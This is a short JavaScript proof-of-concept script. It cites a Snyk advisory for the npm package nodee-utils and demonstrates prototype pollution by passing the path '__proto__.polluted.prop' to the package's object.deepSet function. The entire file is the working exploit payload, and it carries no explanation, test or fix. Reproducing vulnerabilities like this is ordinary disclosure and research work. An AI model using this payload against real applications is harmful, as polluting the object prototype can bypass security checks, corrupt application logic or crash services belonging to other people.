//https://snyk.io/vuln/SNYK-JS-NODEEUTILS-598679

const { object } = require('nodee-utils');

object.deepSet({}, '__proto__.polluted.prop', "yes");
  